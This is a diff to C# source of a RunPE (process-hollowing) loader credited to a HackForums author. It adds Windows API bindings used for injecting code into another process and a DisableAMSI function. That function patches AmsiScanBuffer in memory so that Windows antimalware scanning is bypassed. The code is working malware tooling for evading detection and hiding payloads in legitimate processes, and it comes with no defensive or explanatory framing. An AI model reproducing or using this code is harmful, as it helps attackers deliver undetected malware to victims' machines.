@@ -3,21 +3,48 @@ using System.Runtime.InteropServices;
 
 namespace HackForums.gigajew
 {
-    public unsafe class WinXComponents {
+    public unsafe class WinXComponents
+    {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetProcAddress(IntPtr lib, string name);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr address, uint size, uint flProtect, out uint flOld);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool ZeroMemory(IntPtr address, UIntPtr size);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+       public static extern bool CreateProcess(
+   string lpApplicationName,
+   string lpCommandLine,
+   IntPtr lpProcessAttributes,
+   IntPtr lpThreadAttributes,
+   bool bInheritHandles,
+   uint dwCreationFlags,
+   IntPtr lpEnvironment,
+   string lpCurrentDirectory,
+    StartupInfo* lpStartupInfo,
+   ProcessInfo* lpProcessInformation);
+
+
         [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool CreateProcessInternal([MarshalAs(UnmanagedType.U4)]uint hToken,
-                                 [MarshalAs(UnmanagedType.LPTStr)]string lpApplicationName,
-                                 [MarshalAs(UnmanagedType.LPTStr)]string lpCommandLine,
-                                 [MarshalAs(UnmanagedType.SysInt)]IntPtr lpProcessAttributes,
-                                 [MarshalAs(UnmanagedType.SysInt)]IntPtr lpThreadAttributes,
-                                 [MarshalAs(UnmanagedType.Bool)]bool bInheritHandles,
-                                 [MarshalAs(UnmanagedType.U4)]uint dwCreationFlags,
-                                 [MarshalAs(UnmanagedType.SysInt)]IntPtr lpEnvironment,
-                                 [MarshalAs(UnmanagedType.LPTStr)]string lpCurrentDirectory,
-                                 byte[] lpStartupInfo,
-                                 ProcessInfo* lpProcessInfo,
-                                 [MarshalAs(UnmanagedType.U4)]uint hNewToken);
+                                     [MarshalAs(UnmanagedType.LPTStr)]string lpApplicationName,
+                                     [MarshalAs(UnmanagedType.LPTStr)]string lpCommandLine,
+                                     [MarshalAs(UnmanagedType.SysInt)]IntPtr lpProcessAttributes,
+                                     [MarshalAs(UnmanagedType.SysInt)]IntPtr lpThreadAttributes,
+                                     [MarshalAs(UnmanagedType.Bool)]bool bInheritHandles,
+                                     [MarshalAs(UnmanagedType.U4)]uint dwCreationFlags,
+                                     [MarshalAs(UnmanagedType.SysInt)]IntPtr lpEnvironment,
+                                     [MarshalAs(UnmanagedType.LPTStr)]string lpCurrentDirectory,
+                                     StartupInfo* lpStartupInfo,
+                                     ProcessInfo* lpProcessInfo,
+                                     [MarshalAs(UnmanagedType.U4)]uint hNewToken);
 
         [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -51,17 +78,24 @@ namespace HackForums.gigajew
         [return: MarshalAs(UnmanagedType.SysInt)]
         public static extern IntPtr VirtualAllocEx([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
                                                     [MarshalAs(UnmanagedType.SysInt)]IntPtr lpAddress,
-                                                    [MarshalAs(UnmanagedType.U4)]uint dwSize,
+                                                    [MarshalAs(UnmanagedType.SysUInt)]UIntPtr dwSize,
                                                     [MarshalAs(UnmanagedType.U4)]uint flAllocationType,
                                                     [MarshalAs(UnmanagedType.U4)]uint flProtect);
 
-        [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool WriteProcessMemory([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
-                                                        [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress,
-                                                        [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBuffer,
-                                                        [MarshalAs(UnmanagedType.U4)]uint nSize,
-                                                        [MarshalAs(UnmanagedType.SysInt)]IntPtr lpNumberOfBytesWritten);
+        //[DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
+        //[return: MarshalAs(UnmanagedType.Bool)]
+        //public static extern bool WriteProcessMemory([MarshalAs(UnmanagedType.SysInt)]IntPtr hProcess,
+        //                                                [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBaseAddress,
+        //                                                [MarshalAs(UnmanagedType.SysInt)]IntPtr lpBuffer,
+        //                                                [MarshalAs(UnmanagedType.U4)]uint nSize,
+        //                                                [MarshalAs(UnmanagedType.SysInt)]IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess,
+                                                     IntPtr lpBaseAddress,
+                                                     IntPtr lpBuffer,
+                                                     UIntPtr nSize,
+                                                     IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.U4)]
@@ -78,8 +112,25 @@ namespace HackForums.gigajew
         [DllImport("kernel32.dll", BestFitMapping = true, CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool SetThreadContext([MarshalAs(UnmanagedType.SysInt)]IntPtr hThread, _CONTEXT_AMD64* pContext);
+
+        public static IntPtr AllocateGlobalMemory(int size, int alignment)
+        {
+            IntPtr rawptr = Marshal.AllocHGlobal(size + (alignment / 2));
+            IntPtr aligned = new IntPtr(alignment * (((long)rawptr + (alignment - 1)) / alignment));
+            return aligned;
+            //Marshal.FreeHGlobal(rawptr);
+        }
+
+        public static void DisableAMSI()
+        {
+            IntPtr amsilib = LoadLibrary("amsi.dll");
+            IntPtr proc = GetProcAddress(amsilib, "AmsiScanBuffer");
+            VirtualProtect(proc, 5, 0x40, out uint flold);
+            Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, proc, 6);
+            VirtualProtect(proc, 5, flold, out flold);
+        }
     }
-    
+
     /// <summary>
     /// This RunPE was created by gigajew @ www.hackforums.net for Windows 10 x64
     /// Please leave these credits as a reminder of all the hours of work put into this
@@ -138,7 +189,7 @@ namespace HackForums.gigajew
             {
                 if (Arguments.Length > 0)
                 {
-                    return string.Format("{0} {1}", TargetProcess, string.Join(" ", Arguments));
+                    return string.Format("{0} {1}", TargetProcess, string.Join(" ", Arguments)).TrimEnd(' ');
                 }
             }
 
@@ -157,6 +208,17 @@ namespace HackForums.gigajew
     {
         public IntPtr hProcess;
         public IntPtr hThread;
+    }
+
+    [StructLayout(LayoutKind.Explicit, Size = 0x68)]
+    public struct StartupInfo
+    {
+        [FieldOffset(0)]
+        public uint cb;
+        [FieldOffset(0x3c)]
+        public uint dwFlags;
+        [FieldOffset(0x40)]
+        public ushort wShowWindow;
     }
 
     [StructLayout(LayoutKind.Explicit, Size = 0x28)]
@@ -223,7 +285,7 @@ namespace HackForums.gigajew
         public uint SizeOfHeaders;
     }
 
-    [StructLayout(LayoutKind.Explicit, Size = 0x4d0, Pack = 16)]
+    [StructLayout(LayoutKind.Explicit, Size = 0x4d0)] // pack 16
     public struct _CONTEXT_AMD64
     {
         [FieldOffset(0x30)]
@@ -271,7 +333,7 @@ namespace HackForums.gigajew
         public uint SizeOfHeaders;
     }
 
-    [StructLayout(LayoutKind.Explicit, Size = 0x2cc, Pack = 16)]
+    [StructLayout(LayoutKind.Explicit, Size = 0x2cc)]
     public struct _CONTEXT
     {
         [FieldOffset(0x00)]
